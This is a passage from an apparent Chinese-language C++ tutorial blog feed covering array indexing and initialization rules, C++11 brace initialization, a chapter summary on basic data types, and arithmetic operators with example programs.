class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 访问 monthlySales 数组的第一个元素 (一月)</span></span><br><span class="line">monthlySales[<span class="number">0</span>] = <span class="number">1500.50</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问 monthlySales 数组的第三个元素 (三月)</span></span><br><span class="line">monthlySales[<span class="number">2</span>] = <span class="number">2100.75</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问 scores 数组的最后一个元素</span></span><br><span class="line">scores[<span class="number">4</span>] = <span class="number">95</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 scores 数组的第二个元素</span></span><br><span class="line"><span class="keyword">int</span> secondScore = scores[<span class="number">1</span>]; </span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;March sales: &quot;</span> &lt;&lt; monthlySales[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second score: &quot;</span> &lt;&lt; secondScore &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><p><strong>重要:</strong> C++ 不会自动检查数组索引是否越界。访问 <code>arrayName[N]</code> 或 <code>arrayName[-1]</code>（对于大小为 <code>N</code> 的数组）是**未定义行为 (Undefined Behavior)**，可能导致程序崩溃或数据损坏。程序员有责任确保使用的索引在有效范围内 (<code>0</code> 到 <code>arraySize - 1</code>)。</p><p><strong>数组大小必须是常量表达式:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// int dynamicArray[n]; // 错误! C++ 标准不允许使用变量作为数组大小 (虽然某些编译器可能作为扩展支持)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> SIZE = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> staticArray[SIZE]; <span class="comment">// 正确! SIZE 是 const 常量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> anotherArray[<span class="number">10</span>]; <span class="comment">// 正确! 10 是字面常量</span></span><br></pre></td></tr></table></figure><p>如果需要在运行时确定数组大小，应该使用动态内存分配（<code>new</code>）或标准库提供的容器（如 <code>std::vector</code>），我们将在后续章节学习。</p><h2 id="4-1-2-数组的初始化规则"><a href="#4-1-2-数组的初始化规则" class="headerlink" title="4.1.2 数组的初始化规则"></a>4.1.2 数组的初始化规则</h2><p>在声明数组时，可以同时对其进行初始化。初始化使用花括号 <code>&#123;&#125;</code> 括起来的**初始化列表 (Initializer List)**。</p><p><strong>规则:</strong></p><ol><li><strong>完整初始化:</strong> 提供与数组大小相同数量的初始值。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> scores[<span class="number">5</span>] = &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; <span class="comment">// scores[0]=90, scores[1]=85, ..., scores[4]=88</span></span><br><span class="line"><span class="keyword">double</span> lengths[<span class="number">3</span>] = &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>部分初始化:</strong> 如果提供的初始值数量<strong>少于</strong>数组大小，则<strong>剩余的元素会被自动初始化为 0</strong>（对于数值类型）或相应的零等价值（对于其他类型，如字符数组的空字符 <code>\0</code>）。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> counts[<span class="number">10</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// counts[0]=1, counts[1]=2, counts[2]=3</span></span><br><span class="line">                           <span class="comment">// counts[3] 到 counts[9] 都被初始化为 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> readings[<span class="number">5</span>] = &#123;<span class="number">9.8f</span>&#125;; <span class="comment">// readings[0]=9.8f, 其他元素为 0.0f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组所有元素初始化为 0 的常用方法</span></span><br><span class="line"><span class="keyword">int</span> allZeros[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;; </span><br></pre></td></tr></table></figure></li><li><strong>省略数组大小:</strong> 如果在声明时提供了初始化列表，可以省略方括号中的数组大小。编译器会根据初始化列表中的元素数量自动推断数组大小。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">short</span> values[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// 编译器推断数组大小为 4</span></span><br><span class="line"><span class="keyword">char</span> message[] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;; <span class="comment">// 大小为 6 (包括空字符)</span></span><br></pre></td></tr></table></figure></li><li><strong>不允许初始化列表元素过多:</strong> 初始化列表中的元素数量<strong>不能超过</strong>数组声明的大小。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int errors[3] = &#123;1, 2, 3, 4&#125;; // 错误! 初始化列表元素过多</span></span><br></pre></td></tr></table></figure></li><li><strong>未初始化数组:</strong> 如果在声明数组时没有提供初始化列表（仅适用于非静态局部数组），则数组元素的值是<strong>未定义的 (indeterminate)**，它们会包含内存中遗留的垃圾值。</strong>使用未初始化的变量是常见的错误来源。** <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> garbage[<span class="number">5</span>]; <span class="comment">// 数组元素的值是未定义的 (垃圾值)</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; garbage[0]; // 错误! 使用未初始化的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> staticGarbage[<span class="number">5</span>]; <span class="comment">// 静态存储数组会被默认初始化为 0</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; staticGarbage[0]; // 输出 0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <em>(静态存储持续性的变量，如全局变量、命名空间变量、静态局部变量，会被默认零初始化)</em></li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 完整初始化</span></span><br><span class="line">    <span class="keyword">int</span> fibonacci[<span class="number">8</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fibonacci[5]: &quot;</span> &lt;&lt; fibonacci[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 部分初始化</span></span><br><span class="line">    <span class="keyword">double</span> data[<span class="number">5</span>] = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[0]: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1.1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[1]: &quot;</span> &lt;&lt; data[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2.2</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[2]: &quot;</span> &lt;&lt; data[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[3]: &quot;</span> &lt;&lt; data[<span class="number">3</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Data[4]: &quot;</span> &lt;&lt; data[<span class="number">4</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略大小</span></span><br><span class="line">    <span class="keyword">char</span> vowels[] = &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of vowels: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(vowels) / <span class="keyword">sizeof</span>(<span class="keyword">char</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化所有元素为 0</span></span><br><span class="line">    <span class="keyword">int</span> results[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Results[15]: &quot;</span> &lt;&lt; results[<span class="number">15</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-1-3-C-11数组初始化方法"><a href="#4-1-3-C-11数组初始化方法" class="headerlink" title="4.1.3 C++11数组初始化方法"></a>4.1.3 C++11数组初始化方法</h2><p>C++11 引入了更统一的初始化语法，称为<strong>列表初始化 (List Initialization)</strong> 或**花括号初始化 (Brace Initialization)**，它也可以用于数组。</p><p><strong>主要变化:</strong></p><ol><li> <strong>可以省略等号 <code>=</code>:</strong> 在使用初始化列表时，可以省略声明语句中的等号。</li><li> <strong>禁止缩窄转换 (Narrowing Conversion):</strong> 列表初始化不允许可能导致数据丢失的“缩窄”转换。例如，不能将浮点数直接初始化给整型数组元素，也不能将超出范围的整数值初始化给较小范围的整型数组元素。</li></ol><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">typeName arrayName[arraySize] &#123;<span class="built_in">initializer_list</span>&#125;; <span class="comment">// C++11 列表初始化 (可省略等号)</span></span><br><span class="line">typeName arrayName[] &#123;<span class="built_in">initializer_list</span>&#125;;         <span class="comment">// 省略大小</span></span><br></pre></td></tr></table></figure><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// C++11 列表初始化 (省略等号)</span></span><br><span class="line">    <span class="keyword">int</span> scores[<span class="number">5</span>] &#123;<span class="number">90</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>, <span class="number">88</span>&#125;; </span><br><span class="line">    <span class="keyword">double</span> lengths[<span class="number">3</span>] &#123;<span class="number">1.2</span>, <span class="number">3.4</span>, <span class="number">0.5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> counts[<span class="number">10</span>] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; <span class="comment">// 部分初始化，剩余元素为 0</span></span><br><span class="line">    <span class="keyword">int</span> allZeros[<span class="number">100</span>] &#123;&#125;;     <span class="comment">// 所有元素初始化为 0 (空列表)</span></span><br><span class="line">    <span class="keyword">short</span> values[] &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;; <span class="comment">// 省略大小</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Scores[1]: &quot;</span> &lt;&lt; scores[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 85</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Counts[5]: &quot;</span> &lt;&lt; counts[<span class="number">5</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;allZeros[50]: &quot;</span> &lt;&lt; allZeros[<span class="number">50</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of values: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(values) / <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁止缩窄转换示例</span></span><br><span class="line">    <span class="comment">// int errors[3] &#123;1, 2, 3.0&#125;; // 错误! double (3.0) 到 int 是缩窄转换</span></span><br><span class="line">    <span class="comment">// char chars[2] &#123; &#x27;a&#x27;, 300 &#125;; // 错误! 300 超出 char 的范围 (假设 char 是 8 位)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 允许非缩窄转换</span></span><br><span class="line">    <span class="keyword">char</span> chars_ok[<span class="number">3</span>] &#123; <span class="string">&#x27;a&#x27;</span>, <span class="number">66</span>, <span class="string">&#x27;c&#x27;</span> &#125;; <span class="comment">// 66 在 char 范围内，可以隐式转换为 &#x27;B&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Chars OK: &quot;</span> &lt;&lt; chars_ok[<span class="number">0</span>] &lt;&lt; chars_ok[<span class="number">1</span>] &lt;&lt; chars_ok[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 aBc</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>建议:</strong> C++11 的列表初始化提供了更一致、更安全的初始化方式，推荐在支持 C++11 及更高标准的项目中使用。特别是 <code>typeName arrayName[size] &#123;&#125;;</code> 这种将所有元素初始化为零值的形式非常方便。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.5 总结</title>
      <link href="2025/04/26/3.5_%E6%80%BB%E7%BB%93/"/>
      <url>2025/04/26/3.5_%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本章深入探讨了C++用于处理数据的基本内置类型。我们首先学习了简单变量的命名规则和约定，强调了名称的可读性和合法性。</p><p>接着，我们详细研究了C++的<strong>整型家族</strong>，包括 <code>short</code>、<code>int</code>、<code>long</code> 和 C++11 新增的 <code>long long</code>。我们讨论了它们各自的大小、表示范围以及如何选择合适的类型。我们还介绍了 <code>unsigned</code> 类型，它们用于存储非负整数，并具有更大的正数范围。我们学习了如何书写不同进制（十进制、八进制、十六进制，以及C++14的二进制）的整型字面值，以及如何使用后缀（<code>U</code>, <code>L</code>, <code>LL</code>）来指定常量的具体类型，并了解了编译器在没有后缀时如何推断常量类型。</p><p><code>char</code> 类型被介绍为一种特殊的整型，主要用于存储字符，但也可以作为小整数使用。我们学习了字符字面值（使用单引号）和转义序列。<code>bool</code> 类型也被引入，用于表示逻辑真 (<code>true</code>) 和假 (<code>false</code>)，以及它与整数（1和0）之间的转换关系。</p><p>为了创建不可修改的变量（常量），我们学习了 <code>const</code> 限定符。使用 <code>const</code> 定义的常量必须在声明时初始化，它提供了类型安全和作用域控制，是比 <code>#define</code> 更受推荐的常量定义方式。</p><p>然后，我们转向了<strong>浮点类型</strong> (<code>float</code>, <code>double</code>, <code>long double</code>)，用于表示带小数的数字。我们学习了书写浮点数的两种方式（标准小数点和E表示法），了解了不同浮点类型的精度和范围差异，以及如何使用后缀（<code>f</code>, <code>L</code>）指定浮点常量类型（默认为 <code>double</code>）。我们还讨论了浮点数的优点（范围广、表示小数）和固有的缺点（精度限制、比较困难）。</p><p>最后，我们学习了C++的<strong>基本算术运算符</strong> (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>)。我们探讨了运算符的优先级和结合性规则，以及如何使用括号来控制运算顺序。特别地，我们区分了整数除法（结果截断）和浮点数除法，并学习了求模运算符 <code>%</code> 的用法（主要用于整数求余）。</p><p><strong>类型转换</strong>是本章的另一个重点，包括编译器自动执行的隐式转换（如整型提升和算术转换）和程序员指定的显式转换（C风格转换和更安全的C++转换符 <code>static_cast</code>、<code>dynamic_cast</code>、<code>const_cast</code>、<code>reinterpret_cast</code>）。我们强调了转换中可能出现的信息丢失问题。</p><p>C++11 引入的 <code>auto</code> 关键字也被介绍，它允许编译器根据初始化表达式自动推断变量类型，简化了代码，尤其是在处理复杂类型时。</p><p>通过本章的学习，我们掌握了C++的基本数据类型及其用法，为后续更复杂的数据结构和算法打下了坚实的基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.4 C++算术运算符</title>
      <link href="2025/04/26/3.4_C++%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>2025/04/26/3.4_C++%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>C++提供了丰富的运算符来执行算术计算。本节将介绍基本的算术运算符、它们的优先级和结合性、整数除法和求模运算、类型转换以及 C++11 引入的 <code>auto</code> 类型推断。</p><p><strong>基本算术运算符:</strong></p><ul><li>  <code>+</code>: 加法 (Addition)</li><li>  <code>-</code>: 减法 (Subtraction)</li><li>  <code>*</code>: 乘法 (Multiplication)</li><li>  <code>/</code>: 除法 (Division)</li><li>  <code>%</code>: 求模 (Modulo) 或求余 (Remainder)</li></ul><p>这些运算符可以用于 C++ 的所有数值类型（整型和浮点型），但求模运算符 <code>%</code> 通常只用于整数类型。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">15.50</span>;</span><br><span class="line">    <span class="keyword">double</span> tax_rate = <span class="number">0.08</span>;</span><br><span class="line">    <span class="keyword">int</span> quantity = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> total_items = <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">int</span> items_per_box = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加法</span></span><br><span class="line">    <span class="keyword">double</span> total_price = price * quantity + <span class="number">5.0</span>; <span class="comment">// 假设有 5 元附加费</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total price (with fee): &quot;</span> &lt;&lt; total_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    <span class="keyword">double</span> price_before_tax = price / (<span class="number">1</span> + tax_rate); <span class="comment">// 假设 price 已含税</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price before tax: &quot;</span> &lt;&lt; price_before_tax &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 乘法</span></span><br><span class="line">    <span class="keyword">double</span> tax_amount = price_before_tax * tax_rate;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tax amount: &quot;</span> &lt;&lt; tax_amount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法 (浮点数)</span></span><br><span class="line">    <span class="keyword">double</span> average_price = total_price / quantity;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average price per item: &quot;</span> &lt;&lt; average_price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 除法 (整数) - 见 3.4.2</span></span><br><span class="line">    <span class="keyword">int</span> full_boxes = total_items / items_per_box; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Full boxes: &quot;</span> &lt;&lt; full_boxes &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 求模 - 见 3.4.3</span></span><br><span class="line">    <span class="keyword">int</span> remaining_items = total_items % items_per_box;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remaining items: &quot;</span> &lt;&lt; remaining_items &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一元减法 (取负)</span></span><br><span class="line">    <span class="keyword">double</span> discount = <span class="number">-10.0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discount: &quot;</span> &lt;&lt; discount &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一元加法 (通常无效果)</span></span><br><span class="line">    <span class="keyword">double</span> positive_value = +price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Positive value: &quot;</span> &lt;&lt; positive_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-1-运算符优先级和结合性"><a href="#3-4-1-运算符优先级和结合性" class="headerlink" title="3.4.1 运算符优先级和结合性"></a>3.4.1 运算符优先级和结合性</h2><p>当一个表达式中包含多个运算符时，<strong>优先级 (Precedence)</strong> 和 <strong>结合性 (Associativity)</strong> 决定了运算的执行顺序。</p><ul><li>  <strong>优先级:</strong> 哪个运算符先执行。优先级高的运算符先于优先级低的运算符执行。例如，乘法和除法的优先级高于加法和减法。</li><li><strong>结合性:</strong> 当多个具有相同优先级的运算符连续出现时，它们的执行顺序。<ul><li>  <strong>左结合性 (Left-to-Right):</strong> 运算从左向右执行。大多数二元算术运算符（<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>）都是左结合的。例如 <code>a - b + c</code> 等价于 <code>(a - b) + c</code>。</li><li>  <strong>右结合性 (Right-to-Left):</strong> 运算从右向左执行。赋值运算符 <code>=</code> 和一元运算符（如取负 <code>-</code>）是右结合的。例如 <code>a = b = c</code> 等价于 <code>a = (b = c)</code>。</li></ul></li></ul><p><strong>常见算术运算符优先级 (由高到低):</strong></p><ol><li> 一元运算符: <code>+</code> (正号), <code>-</code> (负号) - (右结合)</li><li> 乘法、除法、求模: <code>*</code>, <code>/</code>, <code>%</code> - (左结合)</li><li> 加法、减法: <code>+</code>, <code>-</code> - (左结合)</li><li> 赋值运算符: <code>=</code> - (右结合)</li></ol><p><strong>使用括号:</strong> 可以使用圆括号 <code>()</code> 来覆盖默认的优先级和结合性，强制按特定顺序执行运算。括号内的表达式总是最先计算。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">5</span>, b = <span class="number">8</span>, c = <span class="number">3</span>, d = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 优先级: * 高于 +</span></span><br><span class="line">    <span class="keyword">int</span> result1 = a + b * c; <span class="comment">// 等价于 a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b * c = &quot;</span> &lt;&lt; result1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 